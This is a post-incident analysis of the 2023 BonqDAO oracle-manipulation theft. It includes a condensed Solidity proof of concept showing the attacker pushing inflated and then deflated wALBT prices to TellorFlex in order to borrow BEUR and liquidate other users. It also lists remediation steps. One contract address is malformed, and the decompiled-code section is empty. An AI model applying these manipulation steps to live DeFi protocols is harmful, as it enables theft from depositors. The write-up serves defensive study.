# BonqDAO — Large-Scale Theft via Tellor Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-02 |
| **Protocol** | BonqDAO |
| **Chain** | Polygon |
| **Loss** | ~88M USD (BEUR 100.5M + ALBT 113.8M) |
| **Attacker** | [0xcAcf2D28...](https://polygonscan.com/address/0xcAcf2D28B2A5309e099f0C6e8C60Ec3dDf656642) |
| **Attack Tx** | 2 transactions (Tx1: BEUR borrowing, Tx2: ALBT liquidation) |
| **Vulnerable Contract** | [0xed596991...](https://polygonscan.com/address/0xed596991ac5f1aa1858da66c67f7cfa7e54b5f1) |
| **Root Cause** | TellorFlex oracle price submission cost was far lower than attack profit, making manipulation economically viable |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/BonqDAO_exp.sol) |

---
## 1. Vulnerability Overview

BonqDAO uses the TellorFlex oracle to evaluate the collateral value of wALBT tokens. TellorFlex is a permissionless oracle that allows anyone to submit price data, but the collateral cost required to manipulate prices (TRB staking) was extremely low compared to the amount that could be stolen. In TX1, the attacker set the wALBT price artificially high to borrow large amounts of BEUR, and in TX2, set the price artificially low to liquidate other users' wALBT CDPs.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable oracle dependency structure
// TellorFlex: anyone can submit prices, dispute resolution takes time
contract TellorFlex {
    function submitValue(
        bytes32 _queryId,
        bytes calldata _value,
        uint256 _nonce,
        bytes calldata _queryData
    ) external {
        // ❌ Price reflected immediately, usable before dispute period (12 hours)
        // ❌ Economically exploitable when staking cost < manipulation profit
    }
}

// BonqDAO uses the latest TellorFlex price directly
function getUnderlyingPrice() external view returns (uint256) {
    (, bytes memory value, uint256 timestamp) = tellor.getDataBefore(queryId, block.timestamp);
    // ❌ Latest value used immediately without waiting for dispute period
    return abi.decode(value, (uint256));
}

// ✅ Fix: Set minimum dispute waiting period
function getUnderlyingPrice() external view returns (uint256) {
    uint256 disputeWait = 12 hours;
    (, bytes memory value,) = tellor.getDataBefore(queryId, block.timestamp - disputeWait);
    // ✅ Only use prices finalized after the dispute period
    return abi.decode(value, (uint256));
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: TellorFlex oracle price submission cost was far lower than attack profit, making manipulation economically viable
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[TX1] wALBT Price Maximization Manipulation──────┐
  │  │                                               │
  │  ├─▶ Submit extremely high wALBT price to TellorFlex │
  │  │   (possible with small TRB stake)             │
  │  │                                               │
  │  └─▶ Borrow large amount of BEUR using wALBT as collateral on BonqDAO│
  │       100,514,098 BEUR stolen ◀──────────────────┘
  │
  └─[TX2] wALBT Price Minimization Manipulation──────┐
     │                                               │
     ├─▶ Submit extremely low wALBT price to TellorFlex │
     │                                               │
     └─▶ Force liquidation of other users' wALBT CDPs  │
          113,813,998 ALBT liquidation profit ◀────────┘
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    // TX1: Borrow massively after maximizing wALBT price
    // 1. Submit manipulated high price to TellorFlex
    tellor.submitValue(wALBT_queryId, encodePrice(INFLATED_PRICE), 0, queryData);

    // 2. Deposit wALBT collateral into BonqDAO at manipulated price
    wALBT.approve(address(bonq), type(uint256).max);
    bonq.createTrove(wALBT_address, collateralAmount);

    // 3. Borrow large amount of BEUR against overvalued collateral
    bonq.borrowBEUR(troveId, MASSIVE_BEUR_AMOUNT);
    // → 100,514,098 BEUR stolen

    // TX2: Liquidate other users after minimizing wALBT price
    tellor.submitValue(wALBT_queryId, encodePrice(DEFLATED_PRICE), 1, queryData);

    // Execute liquidation → obtain ALBT
    bonq.liquidateTrove(victimTroveId);
    // → 113,813,998 ALBT stolen
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Economic Manipulation |
| **Attack Vector** | Exploitation of Tellor permissionless price submission |
| **Impact Scope** | Entire protocol liquidity |
| **DASP Classification** | Oracle Manipulation |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |

## 6. Remediation Recommendations

1. **Mandatory dispute waiting period**: When using Tellor prices, only allow values from at least 12 hours after the dispute period.
2. **Multi-oracle validation**: Halt transactions when Chainlink and Tellor price deviation exceeds a threshold.
3. **VWAP/TWAP-based oracle**: Use time-weighted averages instead of single data points.
4. **Oracle manipulation cost analysis**: Additional defenses required when oracle manipulation cost is low relative to protocol TVL.

## 7. Lessons Learned

- When selecting an oracle, you must evaluate **economic attack cost** against **extractable profit**, not just technical considerations.
- Optimistic oracles like Tellor are fundamentally risky when data is consumed before the dispute period elapses.
- The 88M USD loss is a stark example of just how critical oracle selection is.